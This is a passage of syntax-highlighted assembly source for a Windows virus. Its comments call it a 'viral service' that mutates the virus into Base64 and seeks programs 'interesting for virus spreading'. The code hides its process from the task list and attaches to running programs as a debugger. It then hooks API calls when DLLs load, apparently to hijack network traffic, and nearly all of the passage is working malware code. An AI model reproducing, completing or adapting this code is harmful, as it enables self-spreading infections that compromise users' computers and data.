</span><span class="sc5">OK_RSP</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_GetCurrentProcessId</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_RegisterServiceProcess</span><span class="sc4">]</span><span class="sc0">
                
</span><span class="sc5">ERROR_RSP</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc1">;Launch debug thread</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ServiceCommonPart</span><span class="sc0">

                </span><span class="sc1">;Terminate viral service</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">TerminateViralService</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Viral service common part</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">ServiceCommonPart</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;Get CRC of WSOCK32.DLL file header</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hWSOCK32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">IMAGE_DOS_HEADER.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCRC32</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CRC__Winsock</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc1">;Mutate virus to BASE64 only once</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Path_VirusSystemFile</span><span class="sc0">
                
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_CreateFileA</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">DEBUG__exit</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READONLY</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_CreateFileMappingA</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">DEBUG__closefile</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_MAP_READ</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_MapViewOfFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">DEBUG__closemapping</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MEM_RESERVE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SIZEOF_VIRUS_BASE64</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_VirtualAlloc</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">DEBUG__closeview</span><span class="sc0">
            
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BASE64__encoded</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SIZEOF_VIRUS_BASE64</span><span class="sc4">/</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0A0Dh</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BASE64encode</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_UnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_CloseHandle</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_CloseHandle</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">RepeatAgainAndAgain</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;Initialize TargetProcessID and</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TargetProcessID</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Initialize thread list</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ProcessThreadList</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SIZEOF_VIRUSPROCESSTHREADLIST</span><span class="sc4">*</span><span class="sc5">MAX_NUMBER_OF_THREADS</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc1">;Create debug thread</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DebugThreadID</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DebugEventThread</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_CreateThread</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">DEBUG__release</span><span class="sc0">
                
                </span><span class="sc1">;Wait until thread terminates</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_WaitForSingleObject</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">RepeatAgainAndAgain</span><span class="sc0">

</span><span class="sc5">DEBUG__release</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MEM_DECOMMIT</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MEM_RELEASE</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BASE64__encoded</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_VirtualFree</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">DEBUG__closeview</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_UnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">DEBUG__closemapping</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_CloseHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">DEBUG__closefile</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_CloseHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">DEBUG__exit</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;DebugEventThread</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;A debugger can attach to any existing process in the system, providing</span><span class="sc0">
</span><span class="sc1">;that it has the ID of that process. Through the DebugActiveProcess</span><span class="sc0">
</span><span class="sc1">;function, a debugger can establish the same parent/child relationship</span><span class="sc0">
</span><span class="sc1">;described earlier with active processes. In theory, then, the debugger</span><span class="sc0">
</span><span class="sc1">;should be able to present a list of active processes to the user, allowing</span><span class="sc0">
</span><span class="sc1">;them to select which one they would like to debug. Upon selection, the</span><span class="sc0">
</span><span class="sc1">;debugger could determine the ID of the selected process and begin debugging</span><span class="sc0">
</span><span class="sc1">;it by means of the DebugActiveProcess function. All that is needed then is</span><span class="sc0">
</span><span class="sc1">;a mechanism for enumerating the handles of each active process in the</span><span class="sc0">
</span><span class="sc1">;system. Unfortunately, NT provides no support for determining the ID of</span><span class="sc0">
</span><span class="sc1">;other processes in the system. While this seems to render the function</span><span class="sc0">
</span><span class="sc1">;useless, it really just limits the way it can be used. On its own, a</span><span class="sc0">
</span><span class="sc1">;debugger process cannot determine the ID of other active processes, but</span><span class="sc0">
</span><span class="sc1">;with some help from the system it can get the ID of a specific process in</span><span class="sc0">
</span><span class="sc1">;need of debugging.</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">DebugEventThread</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;Is the first time the thread is called?</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TargetProcessID</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">AlreadyUnderDebug</span><span class="sc0">

</span><span class="sc5">WaitForMemoryTarget</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;Check for programs that are interesting</span><span class="sc0">
                </span><span class="sc1">;for virus spreading</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;The EnumWindows function will enumerate all</span><span class="sc0">
                </span><span class="sc1">;the top-level windows and, for each window,</span><span class="sc0">
                </span><span class="sc1">;do whatever you tell it to do</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EnumWndProc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_EnumWindows</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00002710h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_Sleep</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TargetProcessID</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">WaitForMemoryTarget</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_DebugActiveProcess</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">AlreadyUnderDebug</span><span class="sc0">

</span><span class="sc5">RetryWindowCatch</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TargetProcessID</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">WaitForMemoryTarget</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Debug event handler</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Two functions in Win32, WaitForDebugEvent and ContinueDebugEvent, are</span><span class="sc0">
</span><span class="sc1">;designed specifically for managing debug events as they occur in a process</span><span class="sc0">
</span><span class="sc1">;being debugged. These functions permit a debugger to wait for a debug event</span><span class="sc0">
</span><span class="sc1">;to occur, suspend execution of the process being debugged, process each </span><span class="sc0">
</span><span class="sc1">;debug event, and resume execution of the process being debugged when</span><span class="sc0">
</span><span class="sc1">;finished. Additionally, while the process being debugged is suspended, the</span><span class="sc0">
</span><span class="sc1">;debugger is able to change the thread context information of each of its</span><span class="sc0">
</span><span class="sc1">;threads. This ability provides a mechanism through which the debugger can</span><span class="sc0">
</span><span class="sc1">;alter normal execution of one or more threads in the process being </span><span class="sc0">
</span><span class="sc1">;debugged. It can, for example, change the instruction pointer for a thread</span><span class="sc0">
</span><span class="sc1">;to refer to an instruction at a new location. Then, when the thread resumes</span><span class="sc0">
</span><span class="sc1">;execution, it begins executing code at the new location. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;When a debug event is generated, it comes to the debugger packaged in </span><span class="sc0">
</span><span class="sc1">;a DEBUG_EVENT structure. The structure contains fields that represent an</span><span class="sc0">
</span><span class="sc1">;event code, the process ID of the process that generated the debug event,</span><span class="sc0">
</span><span class="sc1">;the thread ID of the thread executing when the debug event occurred, and</span><span class="sc0">
</span><span class="sc1">;a union of eight structures, one for each of the different events. </span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">EXCEPTION_DEBUG_EVENT</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">CREATE_THREAD_DEBUG_EVENT</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">CREATE_PROCESS_DEBUG_EVENT</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
</span><span class="sc5">EXIT_THREAD_DEBUG_EVENT</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">EXIT_PROCESS_DEBUG_EVENT</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">
</span><span class="sc5">LOAD_DLL_DEBUG_EVENT</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc0">
</span><span class="sc5">UNLOAD_DLL_DEBUG_EVENT</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">
</span><span class="sc5">OUTPUT_DEBUG_STRING_EVENT</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
</span><span class="sc5">RIP_EVENT</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">09h</span><span class="sc0">

</span><span class="sc5">DBG_CONTINUE</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00010002h</span><span class="sc0">
</span><span class="sc5">DBG_TERMINATE_THREAD</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">40010003h</span><span class="sc0"> 
</span><span class="sc5">DBG_TERMINATE_PROCESS</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">40010004h</span><span class="sc0"> 
</span><span class="sc5">DBG_CONTROL_C</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">40010005h</span><span class="sc0"> 
</span><span class="sc5">DBG_CONTROL_BREAK</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">40010008h</span><span class="sc0"> 
</span><span class="sc5">DBG_EXCEPTION_NOT_HANDLED</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80010001h</span><span class="sc0"> 

</span><span class="sc5">AlreadyUnderDebug</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;The WaitForDebugEvent function waits for a</span><span class="sc0">
                </span><span class="sc1">;debugging event to occur in a process being</span><span class="sc0">
                </span><span class="sc1">;debugged</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DebugEventInfo</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_WaitForDebugEvent</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitDebugThread</span><span class="sc0">
                        
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">EXCEPTION_DEBUG_EVENT</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">HandleTargetException</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CREATE_THREAD_DEBUG_EVENT</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">HandleThreadCreation</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CREATE_PROCESS_DEBUG_EVENT</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">HandleProcessCreation</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">EXIT_THREAD_DEBUG_EVENT</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">HandleThreadDestruction</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">EXIT_PROCESS_DEBUG_EVENT</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">HandleProcessDestruction</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">LOAD_DLL_DEBUG_EVENT</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ContinueDebug</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">HookApiProvider</span><span class="sc0">

</span><span class="sc5">ContinueDebug</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">DBG_CONTINUE</span><span class="sc0">

</span><span class="sc5">Go4NewDebugEvent</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DebugEventInfo</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
